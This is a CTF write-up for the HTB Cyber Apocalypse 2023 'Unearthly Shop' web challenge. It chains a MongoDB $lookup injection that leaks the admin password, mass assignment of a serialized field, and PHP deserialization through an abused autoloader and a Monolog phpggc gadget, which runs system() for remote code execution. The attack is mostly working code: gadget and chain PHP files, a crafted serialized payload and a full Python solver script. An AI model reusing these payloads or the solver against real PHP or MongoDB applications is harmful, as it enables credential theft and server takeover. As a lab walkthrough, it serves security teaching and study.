---
layout: post
title: HTB Cyber Apocalypse CTF 2023 - Unearthly Shop
---

"The Ministry has informed Pandora that the UnEarthly Shop may have valuable information on the location of the relic they are looking for. The UnEarthly Shop is a mysterious underground store that sells unearthly artifacts suspected to be remnants of an alien spacecraft. If we can gain access to their server, we may be able to uncover information about the relic's whereabouts. Can you help Pandora in her mission to gain access to the UnEarthly Shop's server and aid in the fight to save humanity?"

This was a hard rated web challenge that required chaining together three separate vulnerabilities to solve. The challenge includes both a frontend and backend component, each with their own PHP codebase and each sharing a MongoDB database.

---

### First Vulnerability - user controlled MongoDB aggregation

The first vulnerability occurs in the frontend. The endpoint takes a user supplied MongoDB aggregation step and runs it on the 'products' collection. Because we control the query, we can use the MongoDB equivalent of a union (as in SQL) to join the users collection to the output and retrieve the admin password.

```php
# frontend/controllers/ShopController.php 
... 
public function products($router) { 
	$json = file_get_contents('php://input'); 
	$query = json_decode($json, true); 
	if (!$query) { 
		$router->jsonify(['message' => 'Insufficient parameters!'], 400); 
	} 
	$products = $this->product->getProducts($query); # takes query directly 
	$router->jsonify($products); 
} 
... 

# frontend/models/ProductModel.php 

... 

public function getProducts($query) { 
	return $this->database->query('products', $query); # and runs it! 
} 

...
```

[![](/assets/image/attachments/2023-02-07-idekCTF2022-simple-file-server.png)](/assets/image/attachments/2023-02-07-idekCTF2022-simple-file-server.png){:.glightbox}

We can trigger this from the frontend to see how it is called.

[![](assets/image/attachments/2023-06-24-HTBCA-Unearthly-Shop-aggregation-example.png)](assets/image/attachments/2023-06-24-HTBCA-Unearthly-Shop-aggregation-example.png){:.glightbox}

It is using the $match aggregation by default. With some research into MongoDB documentation we discovered the $lookup aggregation, which allows pulling in data from other collections. We can make a request like so to include the 'users' collection.

[![](assets/image/attachments/2023-06-24-HTBCA-Unearthly-Shop-lookup.png)](assets/image/attachments/2023-06-24-HTBCA-Unearthly-Shop-lookup.png){:.glightbox}

### Second Vulnerability - mass assignment

With the leaked password, we can now sign into the backend component admin panel. Looking around the codebase we see the admin user can update user details, this might be of interest since we saw serialized data in the user object earlier.

```php
# backend/index.php

...
session_start();

$router = new Router();
$router->new('GET', '/admin/', 'AuthController@index');
$router->new('GET', '/admin/login', 'AuthController@index');
$router->new('GET', '/admin/logout', 'AuthController@logout');

$router->new('POST', '/admin/api/auth/login', 'AuthController@login');
$router->new('POST', '/admin/api/auth/register', 'AuthController@register');

$router->new('GET', '/admin/dashboard', 'DashboardController@index');

$router->new('GET', '/admin/users', 'UserController@index');
$router->new('GET', '/admin/api/users/list', 'UserController@list');
$router->new('POST', '/admin/api/users/update', 'UserController@update'); # update user
$router->new('GET', '/admin/api/users/{param}', 'UserController@view');

$router->new('GET', '/admin/orders', 'OrderController@index');
$router->new('GET', '/admin/api/orders/list', 'OrderController@list');

$router->new('GET', '/admin/products', 'ProductController@index');
$router->new('GET', '/admin/api/products/list', 'ProductController@list');

die($router->match());
```

Looking into this functionality we find something interesting. The validation only checks that certain parameters are present in the update statement, however it does not check if there are additional parameters. We can take advantage of this to perform mass assignment. This will allow us to set our own serialized object into the "access" parameter.

```php
# backend/controllers/UserController.php

...

   public function update($router)
    {
        $json = file_get_contents('php://input');
        $data = json_decode($json, true);

        if (!$data['_id'] || !$data['username'] || !$data['password'])  # parameter validation - only checks these three exist
        {
            $router->jsonify(['message' => 'Insufficient parameters!'], 400);
        }

        if ($this->user->updateUser($data)) {  # passes user controlled JSON into updateUser
            $router->jsonify(['message' => 'User updated successfully!']);
        }

        $router->jsonify(['message' => 'Something went wrong!', 'status' => 'danger'], 500);
    }
...


# backend/models/UserModel.php

...

    public function updateUser($data)
    {
        return $this->database->update('users', $data['_id'], $data); # passes data into update statement
    }

...
```

The serialized object in the "access" variable controls access to certain sections of the UI. We will go into specifics of how this works in the next section, but for now let's tweak it slightly to remove access to one of the sections as a proof-of-concept.

```
# before
"a:4:{s:9:\"Dashboard\";b:1;s:7:\"Product\";b:1;s:5:\"Order\";b:1;s:4:\"User\";b:1;}"

# the b:1 indicates that each of these entries is boolean, let's toggle one and see how the permissions in the UI change
# after
"a:4:{s:9:\"Dashboard\";b:1;s:7:\"Product\";b:1;s:5:\"Order\";b:0;s:4:\"User\";b:1;}"
```

Before:
[![](assets/image/attachments/2023-06-24-HTBCA-Unearthly-Shop-before-serial.png)](assets/image/attachments/2023-06-24-HTBCA-Unearthly-Shop-before-serial.png){:.glightbox}

Sending the request to use mass assignment:
[![](assets/image/attachments/2023-06-24-HTBCA-Unearthly-Shop-mass-assign.png)](assets/image/attachments/2023-06-24-HTBCA-Unearthly-Shop-mass-assign.png){:.glightbox}

Afterwards the orders tab is no longer available:
[![](assets/image/attachments/2023-06-24-HTBCA-Unearthly-Shop-after.png)](assets/image/attachments/2023-06-24-HTBCA-Unearthly-Shop-after.png){:.glightbox}

### Third Vulnerability - Deserialization

We have control over the serialized object in the database, and from our preliminary tests modifying the object has consequences elsewhere in the application. This leads to the conclusion that the object is being deserialized somewhere. After some brief searching we quickly find where:

```php
# backend/models/UserModel.php

...

	public function __construct()
    {
        parent::__construct();
        $this->username = $_SESSION['username'] ?? '';
        $this->email    = $_SESSION['email'] ?? '';
        $this->access   = unserialize($_SESSION['access'] ?? '');
    }

...
```

So we have a PHP deserialization vulnerability. Deserialization in PHP is not as easy to exploit as in languages such as Python, where a universal payload can be used, rather it depends on what classes are available in scope when the object is deserialized. We need to look among these classes to find one with a __wakeup, __destruct (or others) method that will let us do something malicious. Sometimes multiple of these must be chained together to achieve what we desire, these are commonly known as gadgets. More info can be found at [PHP Object Injection | OWASP Foundation](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection).

Examining the code base of the frontend and backend manually there are no obvious candidates, so we must look into the libraries used. Fortunately we can use an open source project called [PHP Generic Gadget Chains](https://github.com/ambionics/phpggc), which keeps track of these exploitable gadgets in open source PHP libraries.

Both applications are using composer to manage their libraries, luckily phpggc has the --test-payload option to makes testing gadget chains on such types of applications more convenient. We use this with an (ugly, but functional) bash loop to test all payloads.

```sh
$ phpggc -h
...

  --test-payload
    Instead of displaying or storing the payload, includes vendor/autoload.php and unserializes the payload.
    The test script can only deserialize __destruct, __wakeup, __toString and PHAR payloads.
    Warning: This will run the payload on YOUR system !

...

# Test every gadget available in libraries in current directory

$ ~/challenges/web_unearthly_shop/phpggc/phpggc -l | grep -v NAME | grep -v Chains | grep -v '\-\-\-' | cut -f 1 -d ' ' | while read -r line; do ~/challenges/web_unearthly_shop/phpggc/phpggc $line --test-payload 2>/dev/null | grep 'SUCCESS' && echo $line ; done
```

[![](assets/image/attachments/2023-06-24-HTBCA-Unearthly-Shop-phpggc.png)](assets/image/attachments/2023-06-24-HTBCA-Unearthly-Shop-phpggc.png){:.glightbox}

"Great, there are valid gadgets!" you might be thinking, but it's not quite that simple. The deserialization occurs in the backend application, so the backend autoload functionality cannot automatically include the classes required for the gadget from the frontend libraries. To get at the frontend classes we somehow need to include the frontend Composer autoload file, at `frontend/vendor/autoload.php`, into the backend scope . Let's take another look at `backend/index.php` to see how the autoloading is done.

```php
# backend/index.php

...
spl_autoload_register(function ($name) {
    if (preg_match('/Controller$/', $name)) {
        $name = "controllers/${name}";
    } elseif (preg_match('/Model$/', $name)) {
        $name = "models/${name}";
    } elseif (preg_match('/_/', $name)) {
        $name = preg_replace('/_/', '/', $name);  # 1. replace '_' with '/'
    }

    $filename = "/${name}.php"; # 2. prepend '/' and append '.php'
 
    if (file_exists($filename)) {
        require $filename;  # 3. include the file
    }
    elseif (file_exists(__DIR__ . $filename)) {
        require __DIR__ . $filename;
    } else {
        throw new Exception("Unable to load $name.");
     }
});
...
```

At first I thought this was just boilerplate, but it's actually a custom autoload implementation with some weird quirks. They are explained by 1, 2, and 3 above, and together allow us to include a PHP file on the local filesystem of our choice. For example, the autoload file we need would be:

```
# start (www is the challenge root inside the container) "www_frontend_vendor_autoload" # after 1. "www/frontend/vendor/autoload" # after 2. "/www/frontend/vendor/autoload.php" # after 3., included
```

Now how do we trigger this to be autoloaded through deserialization? We can simply have a placeholder class like:

```php
<?php

class www_frontend_vendor_autoload {}
```

Which is serialized to:

```php
O:28:"www_frontend_vendor_autoload":0:{}
```

When this is deserialized it will require the frontend autoloader, giving us access to the required gadget classes.

Now, we need to make a payload that includes the frontend autoloader first, and then an RCE gadget. The easiest (and least error prone, I've found through experience (':  ) way is using a PHP script directly. We create two files, one being the gadgets directly from `phpggc` and the latter being a custom script to serialize our gadget.

`gadget.php` (Monolog/RCE6)

```php
<?php

namespace Monolog\Handler 
{


    # RCE gadget (phpggc) https://github.com/ambionics/phpggc/blob/3dd04666dc01c01d41d68f5419576ca6054ced9c/gadgetchains/Monolog/RCE/6/gadgets.php

    class FingersCrossedHandler {
        protected $passthruLevel;
        protected $buffer = array();
        protected $handler;
    
        public function __construct($param, $handler)
        {
            $this->passthruLevel = 0;
            $this->buffer = ['test' => [$param, 'level' => null]];
            $this->handler = $handler;
        }
    
    }

    class BufferHandler
    {
        protected $handler;
        protected $bufferSize = -1;
        protected $buffer;
        # ($record['level'] < $this->level) == false
        protected $level = null;
        protected $initialized = true;
        # ($this->bufferLimit > 0 && $this->bufferSize === $this->bufferLimit) == false
        protected $bufferLimit = -1;
        protected $processors;

        function __construct($function)
        {
            $this->processors = ['current', $function];
        }
    }

}
 
```

`chain.php`

```php
<?php

require 'gadget.php';

# autoload gadget
class www_frontend_vendor_autoload {}


$obj = array(
    7 => new www_frontend_vendor_autoload(),
    8 => new Monolog\Handler\FingersCrossedHandler("/readflag", new Monolog\Handler\BufferHandler('system')),
);
$serialized_obj = serialize($obj);
echo json_encode($serialized_obj);
```

Our chain triggers the SUID `/readflag` binary supplied by the challenge. Note that we json encode the chain because it is sent through json in the post body. Running this we get our chain:

```sh
$ php chain.php
"a:2:{i:7;O:28:\"www_frontend_vendor_autoload\":0:{}i:8;O:37:\"Monolog\\Handler\\FingersCrossedHandler\":3:{s:16:\"\u0000*\u0000passthruLevel\";i:0;s:9:\"\u0000*\u0000buffer\";a:1:{s:4:\"test\";a:2:{i:0;s:9:\"\/readflag\";s:5:\"level\";N;}}s:10:\"\u0000*\u0000handler\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"\u0000*\u0000handler\";N;s:13:\"\u0000*\u0000bufferSize\";i:-1;s:9:\"\u0000*\u0000buffer\";N;s:8:\"\u0000*\u0000level\";N;s:14:\"\u0000*\u0000initialized\";b:1;s:14:\"\u0000*\u0000bufferLimit\";i:-1;s:13:\"\u0000*\u0000processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"system\";}}}}"
```

There is still a small amount of tweaking for behaviour I couldn't achieve in PHP. Firstly, I found the escaping on the forward slash of "\/readflag" broke the chain each time, so we will remove it. Secondly, we can introduce an invalid array entry into the serialized object to replicate the "fast destruct" behaviour of phpggc's -f flag (not sure if required, but I opted for it anyway).

```sh
$ phpggc -h
...
  -f, --fast-destruct
     Applies the fast-destruct technique, so that the object is destroyed
     right after the unserialize() call, as opposed to at the end of the
     script

...
```

after these manual tweaks, we have the payload:

```
"a:3:{i:7;O:28:\"www_frontend_vendor_autoload\":0:{}i:8;O:37:\"Monolog\\Handler\\FingersCrossedHandler\":3:{s:16:\"\u0000*\u0000passthruLevel\";i:0;s:9:\"\u0000*\u0000buffer\";a:1:{s:4:\"test\";a:2:{i:0;s:9:\"/readflag\";s:5:\"level\";N;}}s:10:\"\u0000*\u0000handler\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"\u0000*\u0000handler\";N;s:13:\"\u0000*\u0000bufferSize\";i:-1;s:9:\"\u0000*\u0000buffer\";N;s:8:\"\u0000*\u0000level\";N;s:14:\"\u0000*\u0000initialized\";b:1;s:14:\"\u0000*\u0000bufferLimit\";i:-1;s:13:\"\u0000*\u0000processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"system\";}}}i:7;i:7};"
```

Sending this payload in the mass assignment vulnerability from before, and then logging in again to trigger deserialization, we get the flag.


[![](assets/image/attachments/2023-06-24-HTBCA-Unearthly-Shop-assign-exploit.png)](assets/image/attachments/2023-06-24-HTBCA-Unearthly-Shop-assign-exploit.png){:.glightbox}

[![](assets/image/attachments/2023-06-24-HTBCA-Unearthly-Shop-trigger-deserial.png)](assets/image/attachments/2023-06-24-HTBCA-Unearthly-Shop-trigger-deserial.png){:.glightbox}

Stitching all of these individual parts together, we can form a python script to solve the challenge automatically. I've got around the PHP requirement by embedding the PHP files in the script, and creating them as temporary files, and running them via a subprocess to generate the payload.

```python
#!/usr/bin/env python3
import requests, os, subprocess, json, sys
from tempfile import NamedTemporaryFile

# config
local = True
proxy = True


url = "localhost" if local else "188.166.152.84"
port = 1337 if local else 31447

sess = requests.Session()
p = {'http':'http://127.0.0.1:8080'} if proxy else {}
sess.proxies.update(p)

payload = [
    {
        "$lookup": {
            "from":"users",
            "localField":"_id",
            "foreignField":"_id",
            "as":"Pass"
        }
    },
    {
        "$unwind": {
            "path":"$Pass",
            "preserveNullAndEmptyArrays": True
        }
    }
]

print(f"[*] Leaking password via configurable MongoDB query...")
r = sess.post(f"http://{url}:{port}/api/products", json=payload)

admin_password = r.json()[0]['Pass']['password']
print(f"[+] Leaked password: {admin_password}")


creds = {
    "username": "admin",
    "password": admin_password
}

print(f"[*] Logging in...")
r = sess.post(f"http://{url}:{port}/admin/api/auth/login", data=creds)


print(f"[*] Generating serialized payload...")


# gadget.php
gfh = NamedTemporaryFile(delete=False, suffix='.php')
gadget_body = b"""<?php

namespace Monolog\Handler 
{


    # RCE gadget (phpggc) https://github.com/ambionics/phpggc/blob/3dd04666dc01c01d41d68f5419576ca6054ced9c/gadgetchains/Monolog/RCE/6/gadgets.php

    class FingersCrossedHandler {
        protected $passthruLevel;
        protected $buffer = array();
        protected $handler;
    
        public function __construct($param, $handler)
        {
            $this->passthruLevel = 0;
            $this->buffer = ['test' => [$param, 'level' => null]];
            $this->handler = $handler;
        }
    
    }

    class BufferHandler
    {
        protected $handler;
        protected $bufferSize = -1;
        protected $buffer;
        # ($record['level'] < $this->level) == false
        protected $level = null;
        protected $initialized = true;
        # ($this->bufferLimit > 0 && $this->bufferSize === $this->bufferLimit) == false
        protected $bufferLimit = -1;
        protected $processors;

        function __construct($function)
        {
            $this->processors = ['current', $function];
        }
    }

}

"""
# write gadget temp file
gfh.write(gadget_body)


# chain.php
cfh = NamedTemporaryFile(delete=False, suffix='.php')
chain_pre = f"<?php\n\nrequire '{gfh.name}';".encode()
chain_body = chain_pre + b"""

# autoload gadget
class www_frontend_vendor_autoload {}

# adapted RCE gadget (phpggc) https://github.com/ambionics/phpggc/blob/3dd04666dc01c01d41d68f5419576ca6054ced9c/gadgetchains/Monolog/RCE/6/gadgets.php
# trigger the 'readflag' binary
$obj = array(
    7 => new www_frontend_vendor_autoload(),
    8 => new Monolog\Handler\FingersCrossedHandler("/readflag", new Monolog\Handler\BufferHandler('system')),
);
$serialized_obj = serialize($obj);
echo json_encode($serialized_obj);
"""

# write chain temp file
cfh.write(chain_body)

# close file handles
gfh.close()
cfh.close()

# generate payload
serialized_payload = subprocess.check_output(["php", cfh.name]).decode()

print(f"[*] Editting payload for fast destruct... ")

# fix encoding quirk
serialized_payload = serialized_payload.replace("\/readflag", "/readflag")

# add extra invalid array entry for fast destruct
serialized_payload = "a:3" + serialized_payload[4:-2] + "i:7;i:7};"

print(f"[+] Generated serialized payload: {serialized_payload}")

# delete tempfiles
os.unlink(gfh.name)
os.unlink(cfh.name)



# had to manually craft to get around encoding issues
assign = '{"_id": 1, "username": "admin", "password": "admin", "access":"' + serialized_payload + '"}'

print(f"[*] Using mass assignment to set serialized payload into DB... ")
r = sess.post(f"http://{url}:{port}/admin/api/users/update", data=assign, headers={"Content-Type": "application/json"})


print(f"[*] Triggering payload... ")
# login again to trigger
sess2 = requests.Session()
sess2.post(f"http://{url}:{port}/admin/api/auth/login", data=creds)
r = sess2.get(f"http://{url}:{port}/admin/dashboard")

print("[+] Flag obtained :D : " + r.text.split('\n')[0])
```